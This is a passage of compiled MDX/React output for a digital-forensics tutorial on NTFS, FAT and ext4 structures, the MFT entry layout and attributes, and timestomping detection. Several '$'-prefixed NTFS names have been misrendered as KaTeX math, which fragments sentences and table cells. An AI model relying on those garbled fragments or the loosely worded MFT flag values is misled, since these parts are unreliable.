    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "File"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Purpose"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$MFT"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Master File Table → every file/folder has an entry"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$MFTMirr"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Backup of first 4 MFT entries"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$LogFile"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Transaction log for metadata changes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$Volume"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Volume information (name, version)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$AttrDef"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attribute definitions"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$Bitmap"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cluster allocation bitmap"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$Boot"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Boot sector (VBR)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$BadClus"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bad cluster list"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$Secure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security descriptors (NTFS permissions)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$UpCase"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unicode uppercase table"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$Extend"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extended metadata (quotas, reparse points, object IDs)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "fat-file-allocation-table",
      children: "FAT (File Allocation Table)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Structure:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Boot Sector"
        }), " → BPB (BIOS Parameter Block)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "FAT1 / FAT2"
        }), " → File Allocation Table (two copies for redundancy)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Root Directory"
        }), " → root directory entries (fixed location in FAT16)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Data Region"
        }), " → file content stored in clusters"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "FAT Variants:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "FAT12 → floppy disks, < 32 MB"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "FAT16 → < 2 GB (4 GB with 64 KB clusters)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "FAT32 → < 2 TB (standard), < 16 TB (with 4 KB sectors)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "exFAT → < 128 PB, designed for flash storage"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "ext4-fourth-extended-file-system",
      children: "ext4 (Fourth Extended File System)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Structure:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Superblock"
        }), " → file system metadata (starts at offset 1024)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Group Descriptors"
        }), " → describes each block group"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Block Bitmap"
        }), " → tracks free/used blocks per group"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Inode Bitmap"
        }), " → tracks free/used inodes per group"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Inode Table"
        }), " → array of inodes (file metadata structures)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Data Blocks"
        }), " → file content"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key ext4 Features for Forensics:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Journal (jbd2) → logs metadata changes before commit (can recover previous versions)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Extents → efficient large file allocation tracking"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Inline data → small files stored inside the inode structure"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "42-master-file-table-mft-deep-dive",
      children: "4.2 Master File Table (MFT) Deep Dive"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The MFT is the heart of NTFS forensics. Each file and directory has at least one MFT entry (1024 bytes each). Deleted entries are marked as \"available\" but remain on disk until overwritten."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "MFT Entry Structure (1024 bytes):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Offset  | Size | Field              | Description\n--------|------|--------------------|--------------------------------\n0x00    | 4    | Signature          | \"FILE\" or \"BAAD\" (corrupted)\n0x04    | 2    | USA Offset         | Update sequence array offset\n0x06    | 2    | USA Count          | Update sequence array size\n0x08    | 8    | LogFile Sequence   | LSN (links to $LogFile)\n        |      | Number (LSN)       | \n0x10    | 2    | Sequence Value     | Incremented each time entry reused\n0x12    | 2    | Link Count         | Number of hard links\n0x14    | 2    | Attribute Offset   | Offset to first attribute\n0x16    | 2    | Flags              | 0x00=Deleted, 0x01=File, 0x02=Dir, 0x03=File+Dir\n0x18    | 4    | Bytes in Use       | Size of MFT entry in use\n0x1C    | 4    | Bytes Allocated    | Total size of MFT entry\n0x20    | 8    | Base File Reference| Parent MFT entry reference\n0x28    | 2    | Next Attribute ID  | ID for next attribute\n0x2A    | 2    | Padding            | Boundary alignment\n0x2C    | 4    | MFT Record Number  | Entry number in MFT\n0x30    | 2    | Update Sequence    | Update sequence number\n        |      | Number             | \n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "MFT Standard Attributes:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Attribute Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "ID"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$STANDARD_INFORMATION"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0x10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Timestamps (MACE: Modified, Accessed, Created, MFT Entry Modified), file permissions, flags"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$ATTRIBUTE_LIST"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0x20"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lists attributes when they exceed MFT entry (multi-extent)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$FILE_NAME"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0x30"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Filename (up to 255 chars), parent reference, timestamps"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$OBJECT_ID"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0x40"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "16-byte unique object identifier"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$SECURITY_DESCRIPTOR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0x50"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Owner, group, DACL, SACL"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$VOLUME_NAME"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0x60"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Volume label"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$VOLUME_INFORMATION"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0x70"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Volume version, flags"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$DATA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0x80"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File content (resident or non-resident)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$INDEX_ROOT"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0x90"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Root node of B-tree directory index"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$INDEX_ALLOCATION"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0xA0"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B-tree directory index nodes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$BITMAP"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0xB0"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bitmap for directory index"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$REPARSE_POINT"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0xC0"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Symbolic link info (junction points)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$EA_INFORMATION"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0xD0"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extended attribute information"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$EA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0xE0"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extended attributes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "$LOGGED_UTILITY_STREAM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "0x100"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mi, {
                        children: "E"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "F"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "S"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        stretchy: "false",
                        children: "("
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "e"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "n"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "c"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "r"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "y"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "p"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "t"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "i"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "o"
                      }), (0,jsx_runtime.jsx)(_components.mi, {
                        children: "n"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        stretchy: "false",
                        children: ")"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "EFS (encryption), "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "1em",
                      verticalAlign: "-0.25em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0576em"
                    },
                    children: "E"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.1389em"
                    },
                    children: "F"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0576em"
                    },
                    children: "S"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mopen",
                    children: "("
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    children: "e"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    children: "n"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0278em"
                    },
                    children: "cr"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    style: {
                      marginRight: "0.0359em"
                    },
                    children: "y"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    children: "pt"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    children: "i"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    children: "o"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord mathnormal",
                    children: "n"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mclose",
                    children: ")"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  })]
                })
              })]
            }), "TXF_DATA"]
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "43-analyzing-mft-for-forensic-evidence",
      children: "4.3 Analyzing MFT for Forensic Evidence"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key Forensic Insights from MFT:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Deleted File Recovery"
        }), " → MFT entry flags = 0x00 indicates deleted. Data may still be present in clusters."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Timestomping Detection"
        }), " → Compare ", (0,jsx_runtime.jsxs)(_components.span, {
          className: "katex",
          children: [(0,jsx_runtime.jsx)(_components.span, {
            className: "katex-mathml",
            children: (0,jsx_runtime.jsx)(_components.math, {
              xmlns: "http://www.w3.org/1998/Math/MathML",
              children: (0,jsx_runtime.jsxs)(_components.semantics, {
                children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                  children: [(0,jsx_runtime.jsx)(_components.mi, {
                    children: "S"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "T"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "A"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "N"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "D"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "A"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "R"
                  }), (0,jsx_runtime.jsxs)(_components.msub, {
                    children: [(0,jsx_runtime.jsx)(_components.mi, {
                      children: "D"
                    }), (0,jsx_runtime.jsx)(_components.mi, {
                      children: "I"
                    })]
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "N"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "F"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "O"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "R"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "M"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "A"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "T"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "I"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "O"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "N"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "t"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "i"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "m"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "e"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "s"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "t"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "a"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "m"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "p"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "s"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "w"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "i"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "t"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "h"
                  })]
                }), (0,jsx_runtime.jsx)(_components.annotation, {
                  encoding: "application/x-tex",
                  children: "STANDARD_INFORMATION timestamps with "
                })]
              })
            })
          }), (0,jsx_runtime.jsx)(_components.span, {
            className: "katex-html",
            "aria-hidden": "true",
            children: (0,jsx_runtime.jsxs)(_components.span, {
              className: "base",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "strut",
                style: {
                  height: "0.8889em",
                  verticalAlign: "-0.1944em"
                }
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0576em"
                },
                children: "S"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.1389em"
                },
                children: "T"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "A"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.109em"
                },
                children: "N"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0278em"
                },
                children: "D"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "A"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0077em"
                },
                children: "R"
              }), (0,jsx_runtime.jsxs)(_components.span, {
                className: "mord",
                children: [(0,jsx_runtime.jsx)(_components.span, {
                  className: "mord mathnormal",
                  style: {
                    marginRight: "0.0278em"
                  },
                  children: "D"
                }), (0,jsx_runtime.jsx)(_components.span, {
                  className: "msupsub",
                  children: (0,jsx_runtime.jsxs)(_components.span, {
                    className: "vlist-t vlist-t2",
                    children: [(0,jsx_runtime.jsxs)(_components.span, {
                      className: "vlist-r",
                      children: [(0,jsx_runtime.jsx)(_components.span, {
                        className: "vlist",
                        style: {
                          height: "0.3283em"
                        },
                        children: (0,jsx_runtime.jsxs)(_components.span, {
                          style: {
                            top: "-2.55em",
                            marginLeft: "-0.0278em",
                            marginRight: "0.05em"
                          },
                          children: [(0,jsx_runtime.jsx)(_components.span, {
                            className: "pstrut",
                            style: {
                              height: "2.7em"
                            }
                          }), (0,jsx_runtime.jsx)(_components.span, {
                            className: "sizing reset-size6 size3 mtight",
                            children: (0,jsx_runtime.jsx)(_components.span, {
                              className: "mord mathnormal mtight",
                              style: {
                                marginRight: "0.0785em"
                              },
                              children: "I"
                            })
                          })]
                        })
                      }), (0,jsx_runtime.jsx)(_components.span, {
                        className: "vlist-s",
                        children: "​"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.span, {
                      className: "vlist-r",
                      children: (0,jsx_runtime.jsx)(_components.span, {
                        className: "vlist",
                        style: {
                          height: "0.15em"
                        },
                        children: (0,jsx_runtime.jsx)(_components.span, {})
                      })
                    })]
                  })
                })]
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.109em"
                },
                children: "N"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.1389em"
                },
                children: "F"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0278em"
                },
                children: "O"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0077em"
                },
                children: "R"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.109em"
                },
                children: "M"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "A"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.1389em"
                },
                children: "T"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0785em"
                },
                children: "I"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0278em"
                },
                children: "O"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.109em"
                },
                children: "N"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "t"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "im"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "es"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "t"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "am"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "p"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "s"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0269em"
                },
                children: "w"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "i"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "t"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "h"
              })]
            })
          })]
        }), "FILE_NAME timestamps. Attackers often modify ", (0,jsx_runtime.jsxs)(_components.span, {
          className: "katex",
          children: [(0,jsx_runtime.jsx)(_components.span, {
            className: "katex-mathml",
            children: (0,jsx_runtime.jsx)(_components.math, {
              xmlns: "http://www.w3.org/1998/Math/MathML",
              children: (0,jsx_runtime.jsxs)(_components.semantics, {
                children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                  children: [(0,jsx_runtime.jsx)(_components.mi, {
                    children: "S"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "I"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "b"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "u"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "t"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "f"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "o"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "r"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "g"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "e"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "t"
                  })]
                }), (0,jsx_runtime.jsx)(_components.annotation, {
                  encoding: "application/x-tex",
                  children: "SI but forget "
                })]
              })
            })
          }), (0,jsx_runtime.jsx)(_components.span, {
            className: "katex-html",
            "aria-hidden": "true",
            children: (0,jsx_runtime.jsxs)(_components.span, {
              className: "base",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "strut",
                style: {
                  height: "0.8889em",
                  verticalAlign: "-0.1944em"
                }
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0576em"
                },
                children: "S"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0785em"
                },
                children: "I"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "b"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "u"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "t"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.1076em"
                },
                children: "f"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0278em"
                },
                children: "or"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0359em"
                },
                children: "g"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "e"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                children: "t"
              })]
            })
          })]
        }), "FN."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "File Creation Timeline"
        }), " → MFT records are allocated sequentially. Entry number reveals creation order relative to other files."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
